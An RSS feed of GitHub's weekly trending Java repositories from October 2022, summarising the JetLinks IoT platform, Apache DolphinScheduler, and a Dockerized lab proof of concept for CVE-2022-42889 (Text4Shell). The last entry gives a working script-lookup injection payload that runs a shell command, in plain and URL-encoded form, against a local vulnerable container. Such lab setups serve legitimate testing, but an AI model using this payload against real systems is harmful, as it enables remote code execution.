<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-30T01:47:28Z</updated>
  <subtitle>Weekly Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>jetlinks/jetlinks-community</title>
    <updated>2022-10-30T01:47:28Z</updated>
    <id>tag:github.com,2022-10-30:/jetlinks/jetlinks-community</id>
    <link href="https://github.com/jetlinks/jetlinks-community" rel="alternate"></link>
    <summary type="html">&lt;p&gt;JetLinks 基于Java8,Spring Boot 2.x ,WebFlux,Netty,Vert.x,Reactor等开发, 是一个全响应式的企业级物联网平台。支持统一物模型管理,多种设备,多种厂家,统一管理。统一设备连接管理,多协议适配(TCP,MQTT,UDP,CoAP,HTTP等),屏蔽网络编程复杂性,灵活接入不同厂家不同协议等设备。实时数据处理,设备告警,消息通知,数据转发。地理位置,数据可视化等。能帮助你快速建立物联网相关业务系统。&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;JetLinks 物联网基础平台&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/github/workflow/status/jetlinks/jetlinks-community/Auto%20Deploy%20Docker?label=docker&#34; alt=&#34;GitHub Workflow Status&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/version-1.13--RELEASE-brightgreen&#34; alt=&#34;Version&#34;&gt; &lt;a href=&#34;https://app.codacy.com/gh/jetlinks/jetlinks-community?utm_source=github.com&amp;amp;utm_medium=referral&amp;amp;utm_content=jetlinks/jetlinks-community&amp;amp;utm_campaign=Badge_Grade_Settings&#34;&gt;&lt;img src=&#34;https://api.codacy.com/project/badge/Grade/e8d527d692c24633aba4f869c1c5d6ad&#34; alt=&#34;Codacy Badge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.oscs1024.com/project/jetlinks/jetlinks-community?ref=badge_small&#34;&gt;&lt;img src=&#34;https://www.oscs1024.com/platform/badge/jetlinks/jetlinks-community.svg?size=small&#34; alt=&#34;OSCS Status&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://visitor-badge.glitch.me/badge?page_id=jetlinks&#34; alt=&#34;jetlinks&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://qm.qq.com/cgi-bin/qm/qr?k=LGf0OPQqvLGdJIZST3VTcypdVWhdfAOG&amp;amp;jump_from=webapi&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/QQ%E2%91%A0%E7%BE%A4-2021514-brightgreen&#34; alt=&#34;QQ①群2021514&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://qm.qq.com/cgi-bin/qm/qr?k=IMas2cH-TNsYxUcY8lRbsXqPnA2sGHYQ&amp;amp;jump_from=webapi&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/QQ%E2%91%A1%E7%BE%A4-324606263-brightgreen&#34; alt=&#34;QQ②群324606263&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://qm.qq.com/cgi-bin/qm/qr?k=K5m27CkhDn3B_Owr-g6rfiTBC5DKEY59&amp;amp;jump_from=webapi&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/QQ%E2%91%A2%E7%BE%A4-647954464-brightgreen&#34; alt=&#34;QQ③群647954464&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://qm.qq.com/cgi-bin/qm/qr?k=Gj47w9kg7TlV5ceD5Bqew_M_O0PIjh_l&amp;amp;jump_from=webapi&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/QQ%E2%91%A3%E7%BE%A4-780133058-brightgreen&#34; alt=&#34;QQ④群780133058&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;JetLinks 基于Java8,Spring Boot 2.x,WebFlux,Netty,Vert.x,Reactor等开发, 是一个开箱即用,可二次开发的企业级物联网基础平台。平台实现了物联网相关的众多基础功能, 能帮助你快速建立物联网相关业务系统。&lt;/p&gt; &#xA;&lt;h2&gt;核心特性&lt;/h2&gt; &#xA;&lt;p&gt;支持统一物模型管理,多种设备,多种厂家,统一管理。&lt;/p&gt; &#xA;&lt;p&gt;统一设备连接管理,多协议适配(TCP,MQTT,UDP,CoAP,HTTP等),屏蔽网络编程复杂性,灵活接入不同厂家不同协议的设备。&lt;/p&gt; &#xA;&lt;p&gt;灵活的规则引擎,设备告警,消息通知,数据转发.&lt;/p&gt; &#xA;&lt;p&gt;强大的ReactorQL引擎,使用SQL来处理实时数据.&lt;/p&gt; &#xA;&lt;p&gt;地理位置:统一管理地理位置信息,支持区域搜索.&lt;/p&gt; &#xA;&lt;h2&gt;技术栈&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://spring.io/projects/spring-boot&#34;&gt;Spring Boot 2.3.x&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://spring.io/&#34;&gt;Spring WebFlux&lt;/a&gt; 响应式Web支持&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://r2dbc.io/&#34;&gt;R2DBC&lt;/a&gt; 响应式关系型数据库驱动&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://projectreactor.io/&#34;&gt;Project Reactor&lt;/a&gt; 响应式编程框架&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://netty.io/&#34;&gt;Netty&lt;/a&gt; ,&lt;a href=&#34;https://vertx.io/&#34;&gt;Vert.x&lt;/a&gt; 高性能网络编程框架&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.elastic.co/cn/products/enterprise-search&#34;&gt;ElasticSearch&lt;/a&gt; 全文检索，日志，时序数据存储&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.postgresql.org&#34;&gt;PostgreSQL&lt;/a&gt; 业务功能数据管理&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hs-web&#34;&gt;hsweb framework 4&lt;/a&gt; 业务功能基础框架&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;架构&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/jetlinks/jetlinks-community/master/platform.svg?sanitize=true&#34; alt=&#34;platform&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;设备接入流程&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/jetlinks/jetlinks-community/master/flow.svg?sanitize=true&#34; alt=&#34;flow&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;模块&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;--jetlinks-community&#xA;------|----docker&#xA;------|------|----dev-env       # 启动开发环境&#xA;------|------|----run-all       # 启动全部,通过http://localhost:9000 访问系统.&#xA;------|----jetlinks-components  # 公共组件模块&#xA;------|----jetlinks-manager     # 业务管理模块&#xA;------|----jetlinks-standalone  # 服务启动模块&#xA;------|----simulator            # 设备模拟器&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;文档&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://doc.jetlinks.cn/basics-guide/quick-start.html&#34;&gt;快速开始&lt;/a&gt; &lt;a href=&#34;http://doc.jetlinks.cn/dev-guide/start.html&#34;&gt;开发文档&lt;/a&gt; &lt;a href=&#34;http://doc.jetlinks.cn/common-problems/network-components.html&#34;&gt;常见问题&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>apache/dolphinscheduler</title>
    <updated>2022-10-30T01:47:28Z</updated>
    <id>tag:github.com,2022-10-30:/apache/dolphinscheduler</id>
    <link href="https://github.com/apache/dolphinscheduler" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Apache DolphinScheduler is the modern data workflow orchestration platform with powerful user interface, dedicated to solving complex task dependencies in the data pipeline and providing various types of jobs available `out of the box`&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Dolphin Scheduler Official Website &lt;a href=&#34;https://dolphinscheduler.apache.org&#34;&gt;dolphinscheduler.apache.org&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.apache.org/licenses/LICENSE-2.0.html&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-Apache%202-4EB1BA.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/apache/dolphinscheduler/branch/dev&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/apache/dolphinscheduler/branch/dev/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sonarcloud.io/dashboard?id=apache-dolphinscheduler&#34;&gt;&lt;img src=&#34;https://sonarcloud.io/api/project_badges/measure?project=apache-dolphinscheduler&amp;amp;metric=alert_status&#34; alt=&#34;Quality Gate Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://twitter.com/dolphinschedule&#34;&gt;&lt;img src=&#34;https://img.shields.io/twitter/follow/dolphinschedule.svg?style=social&amp;amp;label=Follow&#34; alt=&#34;Twitter Follow&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://s.apache.org/dolphinscheduler-slack&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&amp;amp;style=social&#34; alt=&#34;Slack Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://starchart.cc/apache/dolphinscheduler&#34;&gt;&lt;img src=&#34;https://starchart.cc/apache/dolphinscheduler.svg?sanitize=true&#34; alt=&#34;Stargazers over time&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/README.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/document-English-blue.svg?sanitize=true&#34; alt=&#34;EN doc&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p&gt;Apache DolphinScheduler is the modern data workflow orchestration platform with powerful user interface, dedicated to solving complex task dependencies in the data pipeline and providing various types of jobs available &lt;code&gt;out of the box&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;The key features for DolphinScheduler are as follows:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Easy to deploy, we provide 4 ways to deploy, such as Standalone deployment,Cluster deployment,Docker / Kubernetes deployment and Rainbond deployment&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Easy to use, there are 3 ways to create workflows:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Visually, create tasks by dragging and dropping tasks&lt;/li&gt; &#xA;   &lt;li&gt;Creating workflows by PyDolphinScheduler(Python way)&lt;/li&gt; &#xA;   &lt;li&gt;Creating workflows through Open API&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Highly Reliable, DolphinScheduler uses a decentralized multi-master and multi-worker architecture, which naturally supports horizontal scaling and high availability&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;High performance, its performance is N times faster than other orchestration platform and it can support tens of millions of tasks per day&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Supports multi-tenancy&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Supports various task types: Shell, MR, Spark, SQL (MySQL, PostgreSQL, Hive, Spark SQL), Python, Procedure, Sub_Workflow, Http, K8s, Jupyter, MLflow, SageMaker, DVC, Pytorch, Amazon EMR, etc&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Orchestrating workflows and dependencies, you can pause/stop/recover task any time, failed tasks can be set to automatically retry&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Visualizing the running state of the task in real-time and seeing the task runtime log&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;What you see is what you get when you edit the task on the UI&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Backfill can be operated on the UI directly&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Perfect project, resource, data source-level permission control&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Displaying workflow history in tree/Gantt chart, as well as statistical analysis on the task status &amp;amp; process status in each workflow&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Supports internationalization&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Cloud Native, DolphinScheduler supports orchestrating multi-cloud/data center workflow, and supports custom task type&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;More features waiting for partners to explore&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;User Interface Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/images/en_US/dag.png&#34; alt=&#34;dag&#34;&gt; &lt;img width=&#34;1100&#34; src=&#34;https://user-images.githubusercontent.com/15833811/197348110-1653ea32-ce07-436c-a0b8-6ac1af80aea5.png&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/images/en_US/data-source.png&#34; alt=&#34;data-source&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/images/en_US/home.png&#34; alt=&#34;home&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/images/en_US/master.png&#34; alt=&#34;master&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/images/en_US/workflow-tree.png&#34; alt=&#34;workflow-tree&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;QuickStart in Docker&lt;/h2&gt; &#xA;&lt;p&gt;Please refer the official website document: &lt;a href=&#34;https://dolphinscheduler.apache.org/en-us/docs/latest/user_doc/guide/start/docker.html&#34;&gt;QuickStart in Docker&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;QuickStart in Kubernetes&lt;/h2&gt; &#xA;&lt;p&gt;Please refer to the official website document: &lt;a href=&#34;https://dolphinscheduler.apache.org/en-us/docs/latest/user_doc/guide/installation/kubernetes.html&#34;&gt;QuickStart in Kubernetes&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;How to Build&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./mvnw clean install -Prelease&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Artifact:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dolphinscheduler-dist/target/apache-dolphinscheduler-${latest.release.version}-bin.tar.gz: Binary package of DolphinScheduler&#xA;dolphinscheduler-dist/target/apache-dolphinscheduler-${latest.release.version}-src.tar.gz: Source code package of DolphinScheduler&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Get Help&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Submit an &lt;a href=&#34;https://github.com/apache/dolphinscheduler/issues/new/choose&#34;&gt;issue&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://s.apache.org/dolphinscheduler-slack&#34;&gt;Join our slack&lt;/a&gt; and send your question to channel &lt;code&gt;#general&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Send email to &lt;a href=&#34;mailto:users@dolphinscheduler.apache.org&#34;&gt;users@dolphinscheduler.apache.org&lt;/a&gt; or &lt;a href=&#34;mailto:dev@dolphinscheduler.apache.org&#34;&gt;dev@dolphinscheduler.apache.org&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;You are very welcome to communicate with the developers and users of Dolphin Scheduler. There are two ways to find them:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Join the Slack channel &lt;a href=&#34;https://asf-dolphinscheduler.slack.com/&#34;&gt;Slack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Follow the &lt;a href=&#34;https://twitter.com/dolphinschedule&#34;&gt;Twitter account of DolphinScheduler&lt;/a&gt; and get the latest news on time&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;How to Contribute&lt;/h2&gt; &#xA;&lt;p&gt;The community welcomes everyone to contribute, please refer to this page to find out more: &lt;a href=&#34;https://raw.githubusercontent.com/apache/dolphinscheduler/dev/docs/docs/en/contribute/join/contribute.md&#34;&gt;How to contribute&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Thanks&lt;/h2&gt; &#xA;&lt;p&gt;DolphinScheduler is based on a lot of excellent open-source projects, such as Google guava, grpc, netty, quartz, and many open-source projects of Apache and so on. We would like to express our deep gratitude to all the open-source projects used in DolphinScheduler. We hope that we are not only the beneficiaries of open-source, but also give back to the community. Besides, we hope everyone who have the same enthusiasm and passion for open source could join in and contribute to the open-source community&lt;/p&gt; &#xA;&lt;h1&gt;Landscapes&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;br&gt;&lt;br&gt; &lt;img src=&#34;https://landscape.cncf.io/images/left-logo.svg?sanitize=true&#34; width=&#34;150&#34;&gt;&amp;nbsp;&amp;nbsp;&lt;img src=&#34;https://landscape.cncf.io/images/right-logo.svg?sanitize=true&#34; width=&#34;200&#34;&gt; &lt;br&gt;&lt;br&gt; DolphinScheduler enriches the &lt;a href=&#34;https://landscape.cncf.io/?landscape=observability-and-analysis&amp;amp;license=apache-license-2-0&#34;&gt;CNCF CLOUD NATIVE Landscape.&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Please refer to the &lt;a href=&#34;https://github.com/apache/dolphinscheduler/raw/dev/LICENSE&#34;&gt;LICENSE&lt;/a&gt; file&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>karthikuj/cve-2022-42889-text4shell-docker</title>
    <updated>2022-10-30T01:47:28Z</updated>
    <id>tag:github.com,2022-10-30:/karthikuj/cve-2022-42889-text4shell-docker</id>
    <link href="https://github.com/karthikuj/cve-2022-42889-text4shell-docker" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Dockerized POC for CVE-2022-42889 Text4Shell&lt;/p&gt;&lt;hr&gt;&lt;h3&gt;Install maven - &lt;a href=&#34;https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu&#34;&gt;maven-linux&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Maven install to create the fat jar&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;mvn clean install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Docker build&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker build --tag=text4shell .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Docker run&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker run -p 80:8080 text4shell&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Test the app&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://localhost/text4shell/attack?search=&amp;lt;anything&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;Attack can be performed by passing a string “${prefix:name}” where the prefix is the aforementioned lookup:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;${script:javascript:java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/foo&#39;)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D&#34;&gt;http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;6&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;You can also try using &lt;code&gt;dns&lt;/code&gt; or &lt;code&gt;url&lt;/code&gt; prefixes.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Get the container id&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker container ls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;8&#34;&gt; &#xA; &lt;li&gt;Get into the app&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker exec -it &amp;lt;container_id&amp;gt; bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;9&#34;&gt; &#xA; &lt;li&gt;To check if above RCE was successful (You should see a file named &lt;code&gt;foo&lt;/code&gt; created in the &lt;code&gt;/tmp&lt;/code&gt; directory):&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;ls /tmp/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;10&#34;&gt; &#xA; &lt;li&gt;To stop the container&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker container stop &amp;lt;container_id&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>